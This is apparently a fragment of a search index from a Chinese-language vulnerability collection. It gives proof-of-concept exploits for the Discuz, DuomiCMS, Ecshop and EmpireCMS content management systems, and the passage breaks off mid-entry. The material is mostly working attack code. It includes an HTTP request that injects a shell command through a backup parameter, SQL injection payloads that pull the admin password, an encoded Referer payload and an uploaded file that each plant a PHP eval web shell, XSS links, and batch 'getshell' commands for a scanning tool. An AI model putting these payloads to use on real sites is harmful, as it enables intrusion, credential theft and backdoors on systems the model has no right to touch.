\u4fee\u6539\u7684\u53c2\u6570 \u53c2\u6570 customtables[] customtables%5B%5D=pre_common_admincp_cmenu\">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php # \u6570\u636e\u5305 POST /discuz25/admin.php?action=db&operation=export&setup=1 HTTP/1.1 Host: localhost Content-Length: 252 Cache-Control: max-age=0 Origin: http://localhost Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://localhost/discuz25/admin.php?action=db&operation=export Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: _ga=GA1.1.994534325.1530166127; PHPSESSID=ffe1069f199ac7656303b61e42db4f5d; ECSCP_ID=e685eee56d5dc4a732b0b1ecb8cbac6becac2355; ECS_ID=b9e7920dfb02c84b5298d0022c64a8fc393376d7; Phpstorm-326452dc=558db1bc-7f7b-4670-8d36-9cef7d8c1b9d; ECS[visit_times]=8; 3Od_visitedfid=2; 3Od_auth=03d3WSoYgxBuC4Yg3mqq4yEVgLBDsrbNx%2F8rIcURpRI5sDFtpC1S9F%2BYa6BViyFggZYM7bac7evIAZJdgLOJ7Q; 3Od_sid=mm4AMQ; QoOR_2132_saltkey=V6AnRzmw; QoOR_2132_lastvisit=1545183584; QoOR_2132_widthauto=-1; R94S_2132_saltkey=1hs56u42; R94S_2132_lastvisit=1545220172; R94S_2132_promotion=1; R94S_2132_auth=75696lGYV1FEogy00DO%2FmyhWbxk8OljAPZAeSvxfgwvvLbMruyS2sfVSYZUG4wr3GYw5L66%2FfppgB9gzioss; R94S_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; R94S_2132_creditbase=0D0D1D0D0D0D0D0D0; R94S_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; R94S_2132_ulastactivity=e0adnKO8pY2qUt5XPBdVc3jbgQxCrCiAkAFzNuN%2Fu9wTbgHc7XLK; R94S_2132_sid=9H4E8j; R94S_2132_lastact=1545224711%09admin.php%09; QoOR_2132_sid=BdGwL9; QoOR_2132_sendmail=1; QoOR_2132_ulastactivity=9cf4%2B3XCcfF1uHee0LOFG0wa6FFvCc1Rp96Kg%2BkgOi%2FL7ovDRKru; QoOR_2132_auth=32d7SwpKowF2VAeqfqe0dWo1FjINHjZA9zt%2ByF8A7LOif0pFSaHnEznijiCaqgsQD8NSBtEiwEDL4Wrnx1gz; QoOR_2132_checkpatch=1; QoOR_2132_checkupgrade=1; QoOR_2132_lastact=1545224853%09admin.php%09 Connection: close formhash=0d2eaac0&scrolltop=&anchor=&type=custom&customtables%5B%5D=pre_common_admincp_cmenu\">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php #&method=shell&extendins=0&sqlcompat=&usehex=1&usezip=0&filename=181219_u0CC19kJ&exportsubmit=%E6%8F%90%E4%BA%A4","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#references","text":"https://paper.seebug.org/763/ https://github.com/FoolMitAh/CVE-2018-14729","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/","text":"Discuz_\uff1c3.4_birthprovince_\u524d\u53f0\u4efb\u610f\u6587\u4ef6\u5220\u9664 \u00b6 Affected Version \u00b6 Discuz < 3.4 \u7248\u672c \u9700\u8981\u4f1a\u5458\u8eab\u4efd\u767b\u9646\u7ad9\u70b9\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1hsOoSte \u5bc6\u7801: nvjj PoC \u00b6 \u6d4b\u8bd5\uff1a \u4e3a\u4e86\u4e0d\u7834\u574f\u539f\u6709\u7a0b\u5e8f\uff0c\u5728\u6839\u76ee\u5f55\u4e0b\u65b0\u5efa 1.txt \u4f5c\u4e3a\u6f14\u793a\u3002 \u767b\u9646\u524d\u53f0\uff0c\u8bbf\u95ee http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&ac=profile&op=base \u5148\u53d1\u8d77\u4e00\u4e2aPOST\u8bf7\u6c42 birthprovince=../../../1.txt&profilesubmit=1&formhash=18a19dce // formhash \u9700\u8981\u53f3\u952e\u67e5\u770b\u6e90\u4ee3\u7801\u5f97\u5230 \u6210\u529f\u540e\uff0c\u4e2a\u4eba\u4fe1\u606f\u5df2\u7ecf\u88ab\u4fee\u6539\u6210\u5982\u4e0b: \u6700\u540e\uff0c\u672c\u5730\u63d0\u4ea4POST\u8868\u5355\u5220\u9664\u6587\u4ef6 1.txt \u8868\u5355\u5185\u5bb9\uff1a <form action=\"http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&ac=profile&op=base\" method=\"POST\" enctype=\"multipart/form-data\"> <input type=\"file\" name=\"birthprovince\" id=\"file\" /> <input type=\"text\" name=\"formhash\" value=\"18a19dce\"/></p> <input type=\"text\" name=\"profilesubmit\" value=\"1\"/></p> <input type=\"submit\" value=\"Submit\" /> </from> \u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u63d0\u4ea4\u4f1a\u5bfc\u81f4\u5220\u9664 birthprovince \u8bbe\u7f6e\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u8fd9\u91cc\u662f 1.txt\u3002 References \u00b6 http://www.freebuf.com/vuls/149904.html http://www.freebuf.com/articles/system/149810.html","title":"Discuz_\uff1c3.4_birthprovince_\u524d\u53f0\u4efb\u610f\u6587\u4ef6\u5220\u9664"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#discuz_34_birthprovince_","text":"","title":"Discuz_\uff1c3.4_birthprovince_\u524d\u53f0\u4efb\u610f\u6587\u4ef6\u5220\u9664"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#affected-version","text":"Discuz < 3.4 \u7248\u672c \u9700\u8981\u4f1a\u5458\u8eab\u4efd\u767b\u9646\u7ad9\u70b9\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1hsOoSte \u5bc6\u7801: nvjj","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#poc","text":"\u6d4b\u8bd5\uff1a \u4e3a\u4e86\u4e0d\u7834\u574f\u539f\u6709\u7a0b\u5e8f\uff0c\u5728\u6839\u76ee\u5f55\u4e0b\u65b0\u5efa 1.txt \u4f5c\u4e3a\u6f14\u793a\u3002 \u767b\u9646\u524d\u53f0\uff0c\u8bbf\u95ee http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&ac=profile&op=base \u5148\u53d1\u8d77\u4e00\u4e2aPOST\u8bf7\u6c42 birthprovince=../../../1.txt&profilesubmit=1&formhash=18a19dce // formhash \u9700\u8981\u53f3\u952e\u67e5\u770b\u6e90\u4ee3\u7801\u5f97\u5230 \u6210\u529f\u540e\uff0c\u4e2a\u4eba\u4fe1\u606f\u5df2\u7ecf\u88ab\u4fee\u6539\u6210\u5982\u4e0b: \u6700\u540e\uff0c\u672c\u5730\u63d0\u4ea4POST\u8868\u5355\u5220\u9664\u6587\u4ef6 1.txt \u8868\u5355\u5185\u5bb9\uff1a <form action=\"http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&ac=profile&op=base\" method=\"POST\" enctype=\"multipart/form-data\"> <input type=\"file\" name=\"birthprovince\" id=\"file\" /> <input type=\"text\" name=\"formhash\" value=\"18a19dce\"/></p> <input type=\"text\" name=\"profilesubmit\" value=\"1\"/></p> <input type=\"submit\" value=\"Submit\" /> </from> \u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u63d0\u4ea4\u4f1a\u5bfc\u81f4\u5220\u9664 birthprovince \u8bbe\u7f6e\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u8fd9\u91cc\u662f 1.txt\u3002","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#references","text":"http://www.freebuf.com/vuls/149904.html http://www.freebuf.com/articles/system/149810.html","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/","text":"dz-ml-rce.py \uff1adiscuz ml RCE \u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177 \u00b6 \u6982\u8ff0 \u00b6 \u6f0f\u6d1e\u5728\u4e8ecookie\u7684language\u53ef\u63a7\u5e76\u4e14\u6ca1\u6709\u4e25\u683c\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u53ef\u4ee5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u8be6\u60c5\u53c2\u8003 discuz ml RCE\u6f0f\u6d1e\u91cd\u73b0\u53ca\u5206\u6790 \u672c\u5de5\u5177\u652f\u6301\u5355url\u548c\u6279\u91cf\u68c0\u6d4b\uff0c\u6709\u5224\u65ad\u6a21\u5f0f\uff08\u53ea\u5224\u65ad\u6709\u65e0\u8be5\u6f0f\u6d1e\uff09\u3001cmdshell\u6a21\u5f0f\uff08\u8fd4\u56de\u7b80\u5355\u7684cmd shell\uff09\u548cgetshell\u6a21\u5f0f\uff08\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\uff09\u3002 \u9700\u6c42 \u00b6 python2.7 pip -r requirements.txt \u4f7f\u7528\u65f6\u52a0\u4e0a\u6f0f\u6d1ePHP\u9875\u9762\uff08\u5982forum.php,portal.php\uff09\uff0c\u76f4\u63a5\u5199\u57df\u540d\u53ef\u80fd\u4f1a\u91cd\u5b9a\u5411\u5bfc\u81f4\u8bef\u62a5! \u5feb\u901f\u5f00\u59cb \u00b6 \u4f7f\u7528\u5e2e\u52a9 python dz-ml-rce.py -h \u5224\u65ad\u6a21\u5f0f python dz-ml-rce.py -u \" http://www.xxx.cn/forum.php \" cmdshell\u6a21\u5f0f python dz-ml-rce.py -u \" http://www.xxx.cn/forum.php \" --cmdshell getshell\u6a21\u5f0f python dz-ml-rce.py -u \" http://www.xxx.cn/forum.php \" --getshell \u6279\u91cf\u68c0\u6d4b python dz-ml-rce.py -f urls.txt \u6279\u91cfgetshell python dz-ml-rce.py -f urls.txt --getshell \u00b6","title":"Discuz ml rce"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#dz-ml-rcepy-discuz-ml-rce","text":"","title":"dz-ml-rce.py \uff1adiscuz ml RCE \u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#_1","text":"\u6f0f\u6d1e\u5728\u4e8ecookie\u7684language\u53ef\u63a7\u5e76\u4e14\u6ca1\u6709\u4e25\u683c\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u53ef\u4ee5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u8be6\u60c5\u53c2\u8003 discuz ml RCE\u6f0f\u6d1e\u91cd\u73b0\u53ca\u5206\u6790 \u672c\u5de5\u5177\u652f\u6301\u5355url\u548c\u6279\u91cf\u68c0\u6d4b\uff0c\u6709\u5224\u65ad\u6a21\u5f0f\uff08\u53ea\u5224\u65ad\u6709\u65e0\u8be5\u6f0f\u6d1e\uff09\u3001cmdshell\u6a21\u5f0f\uff08\u8fd4\u56de\u7b80\u5355\u7684cmd shell\uff09\u548cgetshell\u6a21\u5f0f\uff08\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\uff09\u3002","title":"\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#_2","text":"python2.7 pip -r requirements.txt \u4f7f\u7528\u65f6\u52a0\u4e0a\u6f0f\u6d1ePHP\u9875\u9762\uff08\u5982forum.php,portal.php\uff09\uff0c\u76f4\u63a5\u5199\u57df\u540d\u53ef\u80fd\u4f1a\u91cd\u5b9a\u5411\u5bfc\u81f4\u8bef\u62a5!","title":"\u9700\u6c42"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#_3","text":"\u4f7f\u7528\u5e2e\u52a9 python dz-ml-rce.py -h \u5224\u65ad\u6a21\u5f0f python dz-ml-rce.py -u \" http://www.xxx.cn/forum.php \" cmdshell\u6a21\u5f0f python dz-ml-rce.py -u \" http://www.xxx.cn/forum.php \" --cmdshell getshell\u6a21\u5f0f python dz-ml-rce.py -u \" http://www.xxx.cn/forum.php \" --getshell \u6279\u91cf\u68c0\u6d4b python dz-ml-rce.py -f urls.txt \u6279\u91cfgetshell python dz-ml-rce.py -f urls.txt --getshell","title":"\u5feb\u901f\u5f00\u59cb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#_4","text":"","title":""},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0SQL%E6%B3%A8%E5%85%A5/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 payload \uff1a ajax.php?action=addfav&id=1&uid=1 and extractvalue(1,concat_ws(0x3A,0x3A,version())) \u4f46\u662f\u8981\u60f3\u7206\u51fa\u6709\u7528\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u8fd8\u8981\u7ed5\u8fc7 duomiphp/sql.class.php \u6587\u4ef6\u7684SQL\u68c0\u6d4b\u89c4\u5219\u4ee5\u53ca\u5168\u5c40\u53d8\u91cf\u7684 _RunMagicQuotes \u51fd\u6570\u7684\u8f6c\u4e49\u3002\u8fd9\u91cc\u76f4\u63a5\u7ed9\u51fa\u6211\u6d4b\u8bd5\u6210\u529f\u7684 payload \uff1a http://localhost//duomiphp/ajax.php?action=addfav&id=1&uid=10101 and `'`.``.vid and extractvalue(1,concat_ws(0x3A,0x3A,(select`password` from`duomi_admin` limit 1))) and `'`.``.vid \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/2828#toc-2","title":"DuomiCMS3.0SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0SQL%E6%B3%A8%E5%85%A5/#_1","text":"payload \uff1a ajax.php?action=addfav&id=1&uid=1 and extractvalue(1,concat_ws(0x3A,0x3A,version())) \u4f46\u662f\u8981\u60f3\u7206\u51fa\u6709\u7528\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u8fd8\u8981\u7ed5\u8fc7 duomiphp/sql.class.php \u6587\u4ef6\u7684SQL\u68c0\u6d4b\u89c4\u5219\u4ee5\u53ca\u5168\u5c40\u53d8\u91cf\u7684 _RunMagicQuotes \u51fd\u6570\u7684\u8f6c\u4e49\u3002\u8fd9\u91cc\u76f4\u63a5\u7ed9\u51fa\u6211\u6d4b\u8bd5\u6210\u529f\u7684 payload \uff1a http://localhost//duomiphp/ajax.php?action=addfav&id=1&uid=10101 and `'`.``.vid and extractvalue(1,concat_ws(0x3A,0x3A,(select`password` from`duomi_admin` limit 1))) and `'`.``.vid","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0SQL%E6%B3%A8%E5%85%A5/#_2","text":"https://xz.aliyun.com/t/2828#toc-2","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 payload \u5982\u4e0b\uff1a http://localhost/search.php?searchword={if:phpinfo()}phpinfo(){end \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/2828#toc-2","title":"DuomiCMS3.0\u524d\u53f0\u4ee3\u7801\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","text":"payload \u5982\u4e0b\uff1a http://localhost/search.php?searchword={if:phpinfo()}phpinfo(){end","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_2","text":"https://xz.aliyun.com/t/2828#toc-2","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_SQL%E6%B3%A8%E5%85%A5/","text":"POC \u00b6 Referer\u5904\u3002 \u6ce8\u5165 \u00b6 Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:72:\"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -\";s:2:\"id\";i:1;}","title":"ecshop2.x SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_SQL%E6%B3%A8%E5%85%A5/#poc","text":"Referer\u5904\u3002","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_SQL%E6%B3%A8%E5%85%A5/#_1","text":"Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:72:\"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -\";s:2:\"id\";i:1;}","title":"\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"Affected Version \u00b6 ecshop2.x POC \u00b6 Referer\u5904\u3002 \u4ee3\u7801\u6267\u884c \u00b6 Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";} \u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u751f\u62101.php\u7684\u4e00\u53e5\u8bdd\u3002 assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//}xxx\u0010 file_put_contents('1.php','<?php eval($_POST[1337]); ?>')","title":"Ecshop2.x \u547d\u4ee4\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#affected-version","text":"ecshop2.x","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","text":"Referer\u5904\u3002","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","text":"Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";} \u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u751f\u62101.php\u7684\u4e00\u53e5\u8bdd\u3002 assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//}xxx\u0010 file_put_contents('1.php','<?php eval($_POST[1337]); ?>')","title":"\u4ee3\u7801\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS <= 7.5 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 1.\u8fdb\u5165\u540e\u53f0\u5982\u4e0b\u754c\u9762\uff0c\u70b9\u51fb\u5bfc\u5165\u7cfb\u7edf\u6a21\u578b 2.\u6784\u9020\u6587\u4ef6a.mod,\u5185\u5bb9\u5982\u4e0b <?php file_put_contents(\"shell.php\",\"<?php @eval(\\$_POST[cmd]);?>\");?> 3.\u4e0a\u4f20\u6587\u4ef6a.mod 4.\u67e5\u770b\u6587\u4ef6\u5df2\u7ecf\u6709shell.php\u4e86\uff0c\u83dc\u5200\u8fde\u63a5\u5373\u53ef","title":"EmpireCMS V7.5\u540e\u53f0getshell\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/#_1","text":"EmpireCMS <= 7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/#_2","text":"1.\u8fdb\u5165\u540e\u53f0\u5982\u4e0b\u754c\u9762\uff0c\u70b9\u51fb\u5bfc\u5165\u7cfb\u7edf\u6a21\u578b 2.\u6784\u9020\u6587\u4ef6a.mod,\u5185\u5bb9\u5982\u4e0b <?php file_put_contents(\"shell.php\",\"<?php @eval(\\$_POST[cmd]);?>\");?> 3.\u4e0a\u4f20\u6587\u4ef6a.mod 4.\u67e5\u770b\u6587\u4ef6\u5df2\u7ecf\u6709shell.php\u4e86\uff0c\u83dc\u5200\u8fde\u63a5\u5373\u53ef","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS <=7.5 \u6f0f\u6d1ePOC \u00b6 \u9700\u8981\u6709\u540e\u53f0\u6743\u9650 http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/) \u82e5\u63d0\u793a\u975e\u6cd5\u6765\u6e90\u52a0\u5165\u53c2\u6570hash\u53c2\u6570\uff0c\u4f8b\uff1aehash_gxCQz=zERR2KY6NAMicC0c5OYv,\u5982\u4e0b http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)&ehash_gxCQz=zERR2KY6NAMicC50Yv","title":"EmpireCMS V7.5\u540e\u53f0xss\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/#_1","text":"EmpireCMS <=7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/#poc","text":"\u9700\u8981\u6709\u540e\u53f0\u6743\u9650 http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/) \u82e5\u63d0\u793a\u975e\u6cd5\u6765\u6e90\u52a0\u5165\u53c2\u6570hash\u53c2\u6570\uff0c\u4f8b\uff1aehash_gxCQz=zERR2KY6NAMicC0c5OYv,\u5982\u4e0b http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)&ehash_gxCQz=zERR2KY6NAMicC50Yv","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS V7.5 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 \u9700\u8981\u6709\u540e\u53f0\u6743\u9650\u3002 1.\u767b\u5165\u540e\u53f0\u7ba1\u7406\u9875\u9762 2.\u70b9\u51fb\u7cfb\u7edf->\u5907\u4efd->\u5907\u4efd\u6570\u636e 3.\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u8868\uff0c\u70b9\u51fb\u6700\u4e0b\u9762\u7684\u5f00\u59cb\u5907\u4efd\uff0c\u6293\u5305 4.\u6293\u5305\u540e\u4fee\u6539tablename\u5b57\u6bb5\u4e3a\u547d\u4ee4\u6267\u884c\u8bed\u53e5 5.\u8fd4\u56de\u9875\u9762 6.\u8bbf\u95ee\u5907\u4efd\u8def\u5f84\u4e0bconfig.php\u4ea6\u53ef 7.\u67e5\u770bconfig.php,\u547d\u4ee4\u5df2\u7ecf\u5199\u8fdb\u53bb\u4e86","title":"EmpireCMS V7.5\u540e\u53f0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"EmpireCMS V7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"\u9700\u8981\u6709\u540e\u53f0\u6743\u9650\u3002 1.\u767b\u5165\u540e\u53f0\u7ba1\u7406\u9875\u9762 2.\u70b9\u51fb\u7cfb\u7edf->\u5907\u4efd->\u5907\u4efd\u6570\u636e 3.\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u8868\uff0c\u70b9\u51fb\u6700\u4e0b\u9762\u7684\u5f00\u59cb\u5907\u4efd\uff0c\u6293\u5305 4.\u6293\u5305\u540e\u4fee\u6539tablename\u5b57\u6bb5\u4e3a\u547d\u4ee4\u6267\u884c\u8bed\u53e5 5.\u8fd4\u56de\u9875\u9762 6.\u8bbf\u95ee\u5907\u4efd\u8def\u5f84\u4e0bconfig.php\u4ea6\u53ef 7.\u67e5\u770bconfig.php,\u547d\u4ee4\u5df2\u7ecf\u5199\u8fdb\u53bb\u4e86","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS \u5168\u7248\u672c <7.5 \u6f0f\u6d1ePOC \u00b6 http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)","title":"EmpireCMS \u5168\u7248\u672cXSS\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/#_1","text":"EmpireCMS \u5168\u7248\u672c <7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/#poc","text":"http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS <= V7.5 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 